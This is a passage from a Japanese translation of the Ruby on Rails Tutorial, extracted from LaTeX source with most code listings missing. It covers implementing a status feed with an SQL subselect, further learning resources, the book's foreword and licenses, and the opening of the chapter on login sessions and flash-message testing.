上のコードを書く際に、SQLが\kode{IN}というキーワードをサポートしていることを前提にしています (大丈夫、実際にサポートされています)。このキーワードを使用することで、idの集合の内包 (set inclusion) に対してテストを行えます。
\ref{sec:a_proto_feed}のプロトフィードでは、上のような選択を行うためにActive Recordでリスト{p2}のように{3}where{/3}メソッドを使用していたことを思い出してください。
このときは、選択する対象はシンプルでした。現在のユーザーに対応するユーザーidを持つマイクロポストをすべて選択すればよかったのでした。
ここで行いたい選択は、上よりももう少し複雑で、たとえば以下のような感じになります。
これらの条件から、フォローされているユーザーに対応するidの配列が必要であることがわかってきました。
これを行う方法の1つは、Rubyの\kode{map}メソッドを使用することです。このメソッドはすべての "列挙可能 (enumerable)" オブジェクト (配列やハッシュなど、要素の集合で構成されるあらゆるオブジェクト{p1}) で使用できます。
列挙可能 (enumerable) オブジェクトであることの主な条件は、\kode{each}メソッドを実装していることです。このメソッドはコレクションを列挙します。
なお、このメソッドは\ref{sec:blocks}でも出てきました。他の例題として、\kode{map}メソッドを使って配列を文字列に変換すると、次のようになります。
=> ["1", "2", "3", "4"]
\kode{join}メソッド (\ref{sec:arrays_and_ranges}) を使用すれば、idを集めた文字列を以下のようにカンマ区切りでつなげることもできます。
=> "1, 2, 3, 4"
上のメソッドを使用すれば、\kode{user.following}にある各要素の\kode{id}を呼び出し、フォローしているユーザーのidの配列を構成することができます。
たとえば、データベースの最初のユーザーの場合は、以下の配列になります。
=> [4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23,
24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42,
43, 44, 45, 46, 47, 48, 49, 50, 51]
実際、この手法は実に便利なので、Active Recordは以下でもデフォルトで同じ結果を返します。
この\kode{following\_ids}メソッドは、実はActive Recordによって\kode{has\_many :following}関連付けから自動生成されたものです (リスト\ref{code:has_many_following_through_active_relationships})。これにより、\kode{user.following}コレクションに対応するidを得るための\kode{\_ids}を、関連付けの名前に追加するだけで済みます。
フォローしているユーザーidの文字列は以下のようになります。
=> "4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23,
43, 44, 45, 46, 47, 48, 49, 50, 51
なお、以上は説明のためのコードであり、実際にSQL文字列に挿入するときは、このように記述する必要はありません。実は、\kode{?}を内挿すると自動的にこの辺りの面倒を見てくれます。さらに、データベースに依存する一部の非互換性まで解消してくれます。
つまり、ここでは\kode{following\_ids}メソッドをそのまま使えばよいだけなのです。
結果、最初に想像していたとおり
が無事に動きました!
作成したコードをリスト\ref{code:initial_working_feed}に示します
とりあえず動くフィードの実装 
# ユーザーのステータスフィードを返す
これでテストは \passing になるはずです。
いくつかのアプリケーションにおいては、この初期実装だけで目的が達成され、十分に思えるかもしれません。しかしリスト\ref{code:initial_working_feed}にはまだ足りないものがあります。それが何なのか、次の節に進む前に考えてみてください
(\emph{ヒント:}フォローしているユーザーが5000人もいたらどうなるでしょうか)。
前節のヒントでおわかりのように、\ref{sec:a_first_feed_implementation}のフィードの実装は、投稿されたマイクロポストの数が膨大になったときにうまくスケールアップできません。フォローしているユーザーが5000人程度になるとこういうことが起きる可能性があります。
この節では、フォローしているユーザー数に応じてスケーリングできるように、ステータスフィードを再度実装します。
\ref{sec:a_first_feed_implementation}で示したコードの問題は、\kode{following\_ids}でフォローしている\emph{すべての}ユーザーをメモリーから一気に取り出し、フォローしているユーザーの完全な配列を作り出したことです。
リスト\ref{code:initial_working_feed}の条件では、集合に内包されているかどうかだけしかチェックされていないため、この部分をもっと効率的なコードにできるはずです。そして、SQLは本来このような集合の操作に最適化されています。
これを解決する方法は、フォローしているユーザーのidの検索をデータベースに保存するときに\emph{サブセレクト (subselect) }を使用することです。
リスト\ref{code:feed_second_cut}でコードを若干修正し、フィードをリファクタリングすることから始めましょう。
\kode{where}メソッド内の変数に、キーと値のペアを使う 
    following
次の段階の準備として、以下のコードを
以下の同等のコードに置き換えました。
    following
前者の疑問符を使用した文法も便利ですが、\emph{同じ}変数を複数の場所に挿入したい場合は、後者の置き換え後の文法を使用するのがより便利です。
上の説明が暗に示すように、これからSQLクエリに\emph{もう1つ}の\kode{user\_id}を追加します。
特に、以下のRubyコードは、
以下のSQLスニペットと置き換えることができます。
このコードではSQLサブセレクトが使用されています。ユーザー1についてすべてを選択することは、内部的には以下のような感じになります。
このサブセレクトは、集合のロジックを (Railsではなく) データベースに保存するので、より効率が高まります
これで基礎を固めることができましたので、リスト\ref{code:feed_final}のようにもっと効率なフィードを実装する準備ができました。
フィードの最終的な実装 
                     WHERE follower_id = :user_id"
このコードはRailsとRubyとSQLが複雑に絡み合っていて厄介ですが、ちゃんと動作します。
もちろん、サブセレクトを使用すればいくらでもスケールアップできるなどということはありません。
大規模なWebサイトでは、バックグラウンドジョブを使用して、フィードを非同期で生成するなどの対策が必要でしょう。Webサイトのスケーリングのようなデリケートな問題は本書の範疇を超えます。
リスト\ref{code:feed_final}をもって、ステータスフィードの実装は完了です。
\ref{sec:a_proto_feed}でHomeページには既にフィードを追加していたことを思い出してください。 思い出すキッカケとして、\kode{home}アクションはリスト\ref{code:real_feed_instance_variable}に再掲します。
第\ref{cha:user_microposts}章ではただのプロトタイプでしたが (図\ref{fig:home_with_proto_feed})、リスト\ref{code:feed_final}の実装によって、Homeページで完全なフィードが表示できていることがわかります (図\ref{fig:home_page_with_feed})。
\kode{home}アクション内で、フィードにもページネーションを適用する
Homeページで動作するステータスフィード
この時点で、masterブランチに変更を取り込む準備ができました。
コードをリポジトリにpushして、本番環境にデプロイしてみましょう。
本番環境で動作するステータスフィードは以下のようになります (図\ref{fig:live_status_feed})。
本番環境で動作するステータスフィード
ステータスフィードが追加され、\emph{Ruby on Railsチュートリアル}のサンプルアプリケーションがとうとう完成しました。
このサンプルアプリケーションには、Railsの主要な機能 (モデル、ビュー、コントローラ、テンプレート、パーシャル、フィルタ、検証、コールバック、\kode{has\_many}/\kode{belongs\_to}/\kode{has\_many through}関連付け、セキュリティ、テスティング、展開) が多数含まれています。
これだけでもかなりの量ですが、 Web開発ついて学ぶべきことはまだまだたくさんあります。
今後の学習の手始めとするために、この節では、より踏み込んだ学習をするための方法を紹介します。
<n><n>    \subsection{読み物ガイド} % (fold)<n>    \label{sec:guide_to_further_resources}<n><n>
読むに値するRails関連の書籍やドキュメントは書店やWebでいくらでも見つけられます。正直、あまりの多さに閉口するほどです。
幸い、それらのほとんどが現在でも入手/アクセス可能です。
より高度な技術を身に付けるためのお勧めリソースをいくつかリストアップします。<n><n>[JAPANESE_REFS]
\href{http://screencasts.railstutorial.org/}{Railsスクリーンキャスト}: 本書に合わせて、完全版のスクリーンキャスト (現在は英語版のみ) を用意してあります。
このスクリーンキャストでは、本書の話題をすべてカバーしているだけでなく、さまざまなコツや秘訣も満載されており、スクリーンショットだけでは捉えにくい実際の動作を動画で視聴することもできます。
スクリーンキャスト (英語) は \href{http://www.railstutorial.org/}{Ruby on RailsチュートリアルWebサイト}(英語版)で購入できます。
\href{http://www.gotealeaf.com/railstutorial}{Tealeaf Academy}: 開発者自身による新人向けトレーニング講座が最近増えてきました。身の回りのそういった人がいればよいのですが、そうでない場合はオンラインでどこからでも受講できる\href{http://www.gotealeaf.com/railstutorial}{Tealeaf Academy}があります。
もし体系化されたカリキュラムやインストラクターによるフィードバックが欲しければ、Tealeafは良い選択肢となり得るでしょう。
ほとんどの生徒はプログラミング経験が乏しい時点からスタートしていますが、強い意志と高いモチベーションをもっています (上達にはこれらが必要です)。
Turingスクールでは、生徒が卒業後に職を見つけることを保証していて、見つからなければ授業料を返還しています。
\href{http://www.thinkful.com/a/railstutorial}{Thinkful}: プロのエンジニアとペアを組んで、プロジェクト実践型のカリキュラムで進んでいくオンライン講座です。
対応している科目はRuby on Rails、フロントエンド開発、Webデザイン、データサイエンスです。
\href{https://tutorials.railsapps.org/hartl}{RailsApps}: 教育目的の、Railsアプリケーションのサンプル集です。
\href{http://mbsy.co/6VQ8l}{Code School}: 非常に多種多様なプログラミングを対話的に学習できるコース
\href{https://www.udemy.com/learn-test-driven-development-in-ruby/couponCode=hartl}{Bala Paranj’s Test Driven Development in Ruby}: Rubyを使ってテスト駆動開発を学ぶ、上級者向けのオンライン講座です。
\href{http://railscasts.com/}{RailsCasts}: 最初に\href{http://railscasts.com/episodes/archive}{RailsCastsエピソードアーカイブ}を開いて、目についたトピックを適当に開くところから始めてみるとよいでしょう。
RubyやRailsのお勧め書籍: 「\href{http://www.amazon.com/gp/product/1430223634}{\emph{Beginning Ruby}}」(Peter Cooper 著)、「\href{http://www.amazon.com/gp/product/1933988657}{\emph{The Well-Grounded Rubyist}}」(David A. Black著)、「\href{http://www.amazon.com/Eloquent-Ruby-Addison-Wesley-Professional-Series/dp/0321584104/}{\emph{Eloquent Ruby}}」(Russ Olsen著)、Rubyをさらに深く学ぶのであれば 「\href{http://www.amazon.com/gp/product/0672328844}{\emph{The Ruby Way}}」(Hal Fulton著) がお勧めです。
Railsをさらに深く学ぶのであれば「\href{https://pragprog.com/book/rails4/agile-web-development-with-rails-4}{Agile Web Development with Rails}」(Sam Ruby / Dave Thomas / David Heinemeier Hansson著)、「\href{http://www.amazon.com/Rails-Edition-Addison-Wesley-Professional-Series/dp/0321944275}{\emph{The Rails 4 Way}}」(Obie Fernandez / Kevin Faustino著)、「\href{http://www.amazon.com/Rails-4-Action-Ryan-Bigg/dp/1617291099}{\emph{Rails 4 in Action}}」 (Ryan Bigg / Yehuda Katz著)がお勧めです。<n><n>[RAILSGUIDES_JP]
<n><n>\end{itemize}<n><n>    % subsection guide_to_further_resources (end)<n><n>    \subsection{本章のまとめ} % (fold)<n>    \label{sec:following_users_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n>\item 
\kode{has\_many :through}を使うと、複雑なデータ関係をモデリングできる
\kode{has\_many}メソッドには、クラス名や外部キーなど、いくつものオプションを渡すことができる。たとえば
適切なクラス名と外部キーと一緒に\kode{has\_many}/\kode{has\_many :through}を使うことで、能動的関係 (フォローする) や受動的関係 (フォローされる) がモデリングできた
ルーティングは、ネストさせて使うことができる
\kode{where}メソッドを使うと、柔軟で強力なデータベースへの問い合わせが作成できる
Railsは (必要に応じて) 低級なSQLクエリを呼び出すことができる
本書で学んだすべてを駆使することで、フォローしているユーザーのマイクロポスト一覧をステータスフィードに表示させることができた
HomeページとProfileページにある統計情報のテストを書いてみてください。
\emph{ヒント}: リスト\ref{code:user_profile_test}のテストに追加してください。
(Homeページの統計情報は別のテストにしてみませんか。)
Homeページに表示されている1ページ目のフィードをテストしてください。
リスト\ref{code:home_feed_test}はそのテンプレートです。
\kode{CGI.escapeHTML}でHTMLのエスケープ処理を使っている点に注目して、なぜこれが必要なのか考えてみてください。
(試しにエスケープ処理を外して、HTMLのソースコードを注意深く調べてください。マイクロポストの内容がおかしいはずです。)
フィードのHTMLをテストする
私が前にいた会社 (CD Baby) は、かなり早い段階でRuby on Railsに乗り換えたのですが、またPHPに戻ってしまいました (詳細は私の名前をGoogleで検索してみてください)。
そんな私ですが、Michael Hartl 氏の本を強く勧められたので、その本を使ってもう一度試してみた結果、今度は無事に Rails に乗り換えることができました。それがこの \emph{Ruby on Rails チュートリアル}という本です。
私は多くの Rails 関連の本を参考にしてきましたが、真の決定版と呼べるものは本書をおいて他にありません。
本書では、あらゆる手順が Rails 流で行われています。最初のうちは慣れるまでに時間がかかりましたが、この本を終えた今、ついにこれこそが自然な方式だと感じられるまでになりました。
また、本書は Rails 関連の本の中で唯一、多くのプロが推奨するテスト駆動開発 (TDD: Test Driven Development) を、全編を通して実践しています。実例を使ってここまで分かりやすく解説された本は、本書が初めてでしょう。
極めつけは、Git や GitHub、Heroku の実例に含めている点です。このような、実際の開発現場で使わているツールもチュートリアルに含まれているため、読者は、まるで実際のプロジェクトの開発プロセスを体験しているかのような感覚が得られるはずです。
それでいて、それぞれの実例が独立したセクションになっているのではなく、そのどれもがチュートリアルの内容と見事に一体化しています。
本書は、筋道だった一本道の物語のようになっています。
3日間で読破するのは異常です!
 実際には\emph{もっと時間をかけて読むのが一般的}です。
最初から最後まで、途中を飛ばさずにやるのが一番効果的で有益な読み方です。ぜひやってみてください。
それでは、楽しんでお読みください！
\href{http://sivers.org/}{デレックシバーズ (Derek Sivers)} (\href{http://sivers.org/}{sivers.org})
CD Baby 創始者
著作権とライセンス
\emph{Ruby on Rails チュートリアル: 実例を使って Rails を学ぼう}
 \emph{Ruby on Rails チュートリアル}内の全てのソースコードは、\href{http://opensource.org/licenses/MIT}{MIT ライセンス}および \href{http://people.freebsd.org/~phk/}{Beerware ライセンス}の元で提供されています。
The MIT License<n><n>Copyright (c) 2014 Michael Hartl<n><n>Permission is hereby granted, free of charge, to any person obtaining a copy<n>of this software and associated documentation files (the "Software"), to deal<n>in the Software without restriction, including without limitation the rights<n>to use, copy, modify, merge, publish, distribute, sublicense, and/or sell<n>copies of the Software, and to permit persons to whom the Software is<n>furnished to do so, subject to the following conditions:<n><n>The above copyright notice and this permission notice shall be included in<n>all copies or substantial portions of the Software.
<n><n>THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR<n>IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,<n>FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE<n>AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER<n>LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,<n>OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN<n>THE SOFTWARE.
/*<n> * ----------------------------------------------------------------------------<n> * "THE BEERWARE LICENSE" (Revision 43):<n> * Michael Hartl wrote this code.
As long as you retain this notice you<n> * can do whatever you want with this stuff.
If we meet some day,
 * and you think this stuff is worth it, you can buy me a beer in return.
<n> * ----------------------------------------------------------------------------<n> */
{0}第{1}7{/1}章{/0}でWebサイトでの新規ユーザー登録が行えるようになりましたので、今度はユーザーがログインやログアウトを行えるようにしましょう。
ここでは、Webのログインやログアウトで一般的に実装される、以下の3種類の動作をすべて実装することにします。1: ブラウザを閉じるとログインを破棄する (\ref{sec:sessions_and_failed_login}と\ref{sec:logging_in})。2: ユーザーのログインを\emph{自動で}保存する (\ref{sec:remember_me})。3: ユーザーが「パスワードを保存する (remember me)」チェックボックスをオンにした\emph{場合のみ}ログインを保存する (\ref{sec:remember_me_checkbox})
その他に、一定時間が経過するとセッションを期限切れにするモデルもあります。
このモデルは、インターネットバンキングや金融取引口座などの重要な情報を扱うWebサイトに向いています。
本章で開発する認証 (authentication) システムによって、サイトをカスタマイズして現在のユーザーの「ログインステータス」と「ID」に基づいた認可 (authorization) モデルを実装することができます。
たとえば、本章ではサイトヘッダーのログイン/ログアウトリンクやプロフィールリンクを改造します。
次の{0}第{1}9{/1}章{/0}で使用するセキュリティモデルでは、ログインしたユーザーだけが自分のindexページに移動できるようにしたり、正当なユーザーだけが自分のページのプロフィール情報を編集できるようにしたり、管理者だけが他のユーザーをデータベースから削除できるようにしたりします。
最終的に、{0}第{1}11{/1}章{/0}でマイクロポスト作成時にログイン済みユーザーのIDを使用してマイクロポストとユーザーを関連付け、{2}第{1}12{/1}章{/2}で現在のユーザーが他のユーザーをアプリケーション上でフォローできるようにし、それによって相手のマイクロポストのフィードを自分のページに表示できるようにします。
本章では、アプリケーション全体で共通するログインシステムの細かい部分を多数扱うので、その分他の章に比べて長く、難易度も高くなっています。細部にとらわれると苦しくなるばかりなので、この章を完了するためにも、完璧に理解しようとするよりも、とにかく辛抱強く節をひとつずつ終わらせることを優先してください。
なお、多くの読者が「この章を2回通して完了すると学習効果が非常に高まった」との報告を寄せてくれています。皆さんも、可能であればこの章を2回通して行うことをおすすめいたします。
\href{http://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol}{HTTP}は\href{https://en.wikipedia.org/wiki/Stateless_protocol}{\emph{ステートレスなプロトコル}}です。文字通り「ステート (state)」が「ない (less)」ので、HTTPのリクエストひとつひとつは、それより前のリクエストの情報をまったく利用できない、独立したトランザクションとして扱われます。HTTPは言ってみれば、リクエストが終わると何もかも忘れて次回最初からやり直す健忘症的なプロトコルであり、過去を捨てた旅から旅の流れ者的なプロトコルです (しかし、だからこそこのプロトコルは非常に頑丈なのです)。
この本質的な特性のため、ブラウザのあるページから別のページに移動したときに、ユーザーのIDを保持しておく手段が\href{http://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#HTTP_session_state}{HTTPプロトコル内「には」}まったくありません。ユーザーログインの必要なWebアプリケーションでは、\href{http://en.wikipedia.org/wiki/Session_(computer_science)}{\emph{セッション}}と呼ばれる半永続的な接続をコンピュータ間 (ユーザーのパソコンのWebブラウザとRailsサーバーなど) に別途設定します。セッションはHTTPプロトコルと階層が異なる (上の階層にある) ので、HTTPの特性とは別に (若干影響は受けるものの) 接続を確保できます。(訳注: 昔は離れた相手と一手ずつ葉書をやりとりしてのんびりと将棋を指す酔狂な人がときどきいましたが、将棋の対戦をひとつのセッションと考えれば、その下の郵便システムはHTTP同様ステートレスであり、対戦者同士が盤の状態を保持していれば、郵便システムや郵便配達夫が対戦の進行や内容に一切かかわらなくてもゲームは成立します)。
Railsでセッションを実装する方法として最も一般的なのは、\href{http://en.wikipedia.org/wiki/HTTP_cookie}{\emph{cookies}}を使用する方法です。cookiesとは、ユーザーのブラウザに保存される小さなテキストデータです。
cookiesは、あるページから別のページに移動した時にも破棄されないので、ここにユーザーIDなどの情報を保存できます。アプリケーションはcookies内のデータを使用して、たとえばログイン中のユーザーが所有する情報をデータベースから取り出すことができます。
ブラウザによっては、「中断した時点から再開」などのオプション機能でセッションを復旧できるものもあります。このような動作はブラウザ依存で、かつブラウザ側でしか行えないので、Railsサーバーではこうしたセッション復旧機能を実現することはできません。
セッションをRESTfulなリソースとしてモデリングできると、他のRESTfulリソースと統一的に理解できて便利です。ログインページでは\emph{new}で新しいセッションを出力し、そのページでログインすると\emph{create}でセッションを実際に作成して保存し、ログアウトすると\emph{destroy}でセッションを破棄する、といった具合です。
ただしUsersリソースと異なるのは、UsersリソースではバックエンドでUserモデルを介してデータベース上の永続的データにアクセスするのに対し、Sessionリソースでは代わりにcookiesを保存場所として使用する点です。ログインのしくみの大半は、cookiesを使用した認証メカニズムによって構築されています。
本節と次の節では、セッション機能を作成する準備として、Sessionコントローラ、ログイン用のフォーム、両者に関連するコントローラのアクションを作成します。
\ref{sec:logging_in}では、セッションを操作するために必要なコードをいくつか追加し、ユーザーログインを完成させる予定です。
前章同様に、トピックブランチで作業してから、最後に更新をマージします。
ログインとログアウトの要素を、Sessionsコントローラの特定のRESTアクションにそれぞれ対応付けることにします。ログインのフォームは、この節で扱う\kode{new}アクションで処理します。\kode{create}アクションに\texttt{POST}リクエストを送信すると、実際にログインします (\ref{sec:logging_in})。\kode{destroy}アクションに\texttt{DELETE}リクエストを送信すると、ログアウトします (\ref{sec:logging_out})
(表\ref{table:RESTful_users}のHTTPメソッドとRESTアクションの関連付けを思い出しましょう)。
最初に、Sessionsコントローラと\kode{new}アクションを生成します。
\ref{sec:signup_form}のユーザー登録ページのときと同様に、図\ref{fig:login_mockup}モックアップを元にセッション新規開始用のログインフォームを作成します。
ログインフォームのモックアップ
Usersリソースのときは専用の\kode{resources}メソッドを使用してRESTfulなルーティングを自動的にフルセットで利用できるようにしました (リスト\ref{code:users_resource}) が、Sessionリソースではフルセットはいらないので、「名前付きルーティング」だけを使用します。この名前付きルーティングでは、\texttt{GET}リクエストや\texttt{POST}リクエストを\kode{login}ルーティングで、\texttt{DELETE}リクエストを\kode{logout}ルーティングで扱います。
このルーティングを反映したものをリスト\ref{code:sessions_resource}に示します。なお、\kode{rails generate controller}で生成された不要なルートは、このリストから削除してあります。
リソースを追加して標準的なRESTfulアクションをgetできるようにする
リスト\ref{code:sessions_resource}で定義したルーティングのURLやアクション (表\ref{table:RESTful_users}) は、ユーザー用のURLやアクション (表\ref{table:RESTful_sessions}) とだいたい似ています。
新しいセッションのページ (ログイン)
新しいセッションの作成 (ログイン)
/logout
セッションの削除 (ログアウト)
{0}表8.1{/0} {1}リスト\ref{code:sessions_resource}{/1}のセッションルールによって提供されるルーティング
これまでに名前付きルーティングをだいぶ追加してきたので、ここでアプリケーションの全ルーティングを表示できると便利です。\kode{rake routes}コマンドを実行すればいつでもルーティングのリストを表示できます。
$ bundle exec rake routes<n> Prefix Verb   URI Pattern               Controller#Action<n>     root GET    /                         static_pages#home<n>     help GET    /help(.:format)           static_pages#help<n>    about GET    /about(.:format)          static_pages#about<n>  contact GET    /contact(.:format)        static_pages#contact<n>   signup GET    /signup(.:format)         users#new<n>    login GET    /login(.:format)          sessions#new<n>          POST   /login(.:format)          sessions#create<n>   logout DELETE /logout(.:format)         sessions#destroy<n>    users GET    /users(.:format)          users#index<n>          POST   /users(.:format)          users#create<n> new_user GET    /users/new(.:format)      users#new<n>edit_user GET    /users/:id/edit(.:format) users#edit<n>     user GET    /users/:id(.:format)      users#show<n>          PATCH  /users/:id(.:format)      users#update<n>          PUT    /users/:id(.:format)      users#update<n>          DELETE /users/:id(.:format)      users#destroy
今はこのルーティングを完全に理解できる必要はありません。それでもこのリストを何となく眺めてみれば、アプリケーションでサポートされている全アクションがこのリストにあることに気付くと思います。
コントローラとルーティングを定義したので、今度は新しいセッションで使用するビュー、つまりログインフォームを整えましょう。
図\ref{fig:login_mockup}と図\ref{fig:signup_mockup}を比較してみると、ログインフォームとユーザー登録フォームにはほとんど違いがないことがわかります。違いは、4つあったフィールドが [Email] と [Password] の2つに減っていることだけです。
ログインフォームで入力した情報に誤りがあったときは、ログインページをもう一度表示してエラーメッセージを出力します (図\ref{fig:login_failure_mockup})。
\ref{sec:signup_error_messages}では、エラーメッセージの表示にエラーメッセージ用パーシャル (部分テンプレート) を使用しましたが、そのエラーメッセージはActive Recordによって自動的に表示されていたことを思い出しましょう。
セッションはActive Recordオブジェクトではないので、上のようにActive Recordがよしなにエラーメッセージを表示してくれるということは期待できません。そこで、ここではフラッシュメッセージでエラーを表示します。
{0}図8.2{/0} {1}ログイン失敗時のモックアップ{/1}
リスト\ref{code:signup_form}のときは、以下のようにユーザー登録フォームで\kode{form\_for}ヘルパーを使用し、ユーザーのインスタンス変数\kode{@user}を引数にとっていました。
セッションフォームとユーザー登録フォームの最大の違いは、セッションにはSessionモデルというがなく、そのため\kode{@user}のようなインスタンス変数に相当するものもない点です。
従って、新しいセッションフォームを作成するときには、\kode{form\_for}ヘルパーに追加の情報を独自に渡さなければなりません。
Railsでは上のように書くだけで、「フォームの\kode{action}は/usersというURLへの\texttt{POST}である」と自動的に判定しますが、セッションの場合はリソースの\emph{名前}とそれに対応するURLを具体的に指定する必要があります
(注: \kode{form\_for}の代わりに\kode{form\_tag}を使うこともでき、Railsではこの方が慣用的な方法です。しかし、ユーザー登録フォームではform_forを使用する方が一般的であり、並列構造を強調するためにもform_forを使用しました。
適切な\kode{form\_for}を使用することで、リスト\ref{fig:login_mockup}のユーザー登録フォームを参考にして、リスト\ref{code:signup_form}に示したようなモックアップに従ったログインフォームを簡単に作成できます (図\ref{code:login_form})。
ログインフォームのコード
ユーザーがすぐクリックできるように、ユーザー登録ページのリンクを追加してあることにご注目ください。
リスト\ref{code:login_form}のコードを使用すると、図\ref{fig:login_form}のようにログインフォームが表示されます
([Log in] リンクがまだ効かないので、自分でブラウザのアドレスバーに「/login」とURLを直接入力してください。
ログインリンクは\ref{sec:changing_the_layout_links}で動くようにします)。
ログインフォーム
生成されたHTMLフォームをリスト\ref{code:login_form_html}に示します。
{0}リスト8.3:{/0} <n><n>{1}リスト\ref{code:login_form}で生成したログインフォームのHTML<n>{/1}
ユーザー登録では最初にユーザーを作成しましたが、ログインでセッションを作成する場合に最初に行うのは、入力が\emph{無効な}場合の処理です。
最初に、フォームが送信されたときの動作を順を追って理解します。次に、ログインが失敗した場合に表示されるエラーメッセージを配置します (モックアップを図\ref{fig:login_failure_mockup}に示します)。
次に、ログインに成功した場合 (\ref{sec:logging_in}) に使用する土台部分を作成します。ここでは、ログインが送信されるたびに、パスワードとメールアドレスの組み合わせが有効かどうかを判定します。
それでは、最初に最小限の\kode{create}アクションをSessionsコントローラで定義し、空の\kode{new}アクションと\kode{destroy}アクションもついでに作成しておきましょう (リスト\ref{code:initial_create_session})。
リスト{p0}の{2}create{/2}アクションの中では何も行われませんが、アクションを実行すると{2}new{/2}ビューが出力されるのでこれで十分です。
\href{http://localhost:3000/sessions/new}{/sessions/new}フォームを送信すると図\ref{fig:initial_failed_login_rails_3}のようになります。
Sessionsコントローラの\kode{create}アクション (暫定版)
リスト{p2}の{4}create{/4}で最初に失敗したログイン
図\ref{fig:initial_failed_login_rails_3}に表示されているデバッグ情報にご注目ください。\ref{sec:login_form}の終わりでも簡単に触れましたが、\kode{params}ハッシュでは、以下のように\kode{session}キーの下にメールアドレスとパスワードがあります。
ユーザー登録の場合 (図\ref{fig:signup_failure}) と同様、これらのパラメータはリスト{p2}に示したように{3}ネストした (入れ子になった) {/3}ハッシュになっていました。
特に、\kode{params}は以下のような入れ子ハッシュになっています。ハッシュの中にハッシュがある構造です。
上も自体もハッシュであり、以下の要素を含んでいます。
その結果、
上はフォームから送信されたメールアドレスであり、
上はフォームから送信されたパスワードです。
要するに\kode{create}アクションの中では、ユーザーの認証に必要なあらゆる情報を\kode{params}ハッシュから簡単に取り出せるということです。
そして、認証に必要なすべてのメソッドもここまでに学んであります (そうなるように本書を書いたのです)。ここでは、Active Recordが提供する\kode{User.find\_by}メソッド (\ref{sec:finding_user_objects}) と、\kode{has\_secure\_password}が提供する\kode{authenticate}メソッド (\ref{sec:creating_and_authenticating_a_user}) を使用します。
認証
selfを省略した結果をリスト\ref{code:find_authenticate_user}に示します。
ユーザーをデータベースから見つけて検証する
ハイライト部分の最初の行 (リスト\ref{code:find_authenticate_user}) では、送信されたメールアドレスを使用して、データベースからユーザーを取り出しています
(\ref{sec:uniqueness_validation}ではメールアドレスをすべて小文字で保存していたことを思い出しましょう。そこでここでは\kode{downcase}メソッドを使用して、有効なメールアドレスが入力されたときに確実にマッチするようにしています)。
次の行は少しわかりにくいかもしれませんが、Railsプログラミングでは定番の手法です。
Rubyでは\kode{nil}と\kode{false}以外のすべてのオブジェクトは、真偽値では\kode{true}になる (\ref{sec:objects_and_message_passing}) という性質を考慮すると、&&の前後の値の組み合わせは表\ref{table:user_and_and}のようになります。
表\ref{table:user_and_and}を見ると、入力されたメールアドレスを持つユーザーがデータベースに存在し、かつ入力されたパスワードがそのユーザーのパスワードである場合のみ、\kode{if}文が\kode{true}になることがわかります。言葉でまとめると「ユーザーがデータベースにあり、かつ、認証に成功した場合にのみ」となります。
存在しない
誤ったパスワード
正しいパスワード
\ref{sec:signup_error_messages}では、ユーザー登録のエラーメッセージ表示にUserモデルのエラーメッセージをうまく利用したことを思い出しましょう。
ユーザー登録の場合、エラーメッセージは特定のActive Recordオブジェクトに関連付けられていたのでその手が使えました。しかしセッションではActive Recordのモデルを使用していないため、その手が通用しません。
そこで、ログインに失敗したときには代わりにフラッシュメッセージを表示することにします。
最初のコードをリスト\ref{code:failed_login_attempt}に示します (このコードはわざと少し間違えてあります)。
ログイン失敗時の処理を扱う (誤りあり)
ログインに失敗したときのフラッシュメッセージ
本文およびリスト\ref{code:failed_login_attempt}のコメントで述べたように、このコードには誤りがあります。
ページにはちゃんとエラーメッセージが表示されていますが、どこが問題なのでしょうか。
実は上のコードのままでは、\emph{リクエスト}のフラッシュメッセージが一度表示されると消えずに残ってしまいます。リスト\ref{code:signup_flash}でリダイレクトを使用したときとは異なり、表示したテンプレートを\kode{render}メソッドで強制的に再レンダリングしてもリクエストと見なされないため、リクエストのメッセージが消えません。
たとえば、わざと無効な情報を入力して送信してエラーメッセージを表示してから、Homeページをクリックして移動すると、そこでもフラッシュメッセージが表示されたままになっています (図\ref{fig:flash_persistence})。
この問題は\ref{sec:a_flash_test}で修正します。
{0}図8.6{/0} {1}フラッシュメッセージが消えずに残っている例{/1}
\label{fig:flash_persistence}}<n>\end{figure}<n><n><n>    % subsubsection rendering_with_a_flash_message (end)<n><n>  \subsection{フラッシュのテスト} % (fold)<n>  \label{sec:a_flash_test}<n><n>
フラッシュメッセージが消えない問題は、このアプリケーションの小さなバグです。
さっそく、ログインフォームの送信について簡単な統合テストを作成することから始めましょう。
この統合テストは、そのままバグのドキュメントにもなり、今後の回帰バグ発生を防止する効能もあります。さらに、今後この統合テストを土台として、より本格的な統合テストを作成するときにも便利です。
アプリケーションのログインの挙動をテストするために、最初に統合テストを生成します。
次に、図\ref{fig:failed_login_flash}と図\ref{fig:flash_persistence}の手順をテストコードで再現する必要があります。
基本的な流れを以下に示します。
ログイン用のパスを開く
新しいセッションのフォームが正しく表示されたことを確認する
わざと無効な\kode{params}ハッシュを使用してセッション用パスにPOSTする
新しいセッションのフォームが再度表示され、フラッシュメッセージが追加されることを確認する
別のページ (Homeページなど) にいったん移動する
移動先のページでフラッシュメッセージが表示\emph{されていない}ことを確認する
上のテスト手順の実装をリスト\ref{code:flash_persistence_test}に示します。
フラッシュメッセージの残留をキャッチするテスト
login_path
$ bundle exec rake test TEST=test/integration/users_login_test.rb
上のように、引数で\kode{TEST}にテストファイルのフルパスを与えると、そのテストファイルだけを実行できます。
リスト\ref{code:flash_persistence_test}の失敗するテストをパスさせるには、本編のコードで\kode{flash}を\kode{flash.now}に置き換えます。後者は、レンダリングが終わっているページで特別にフラッシュメッセージを表示することができます。
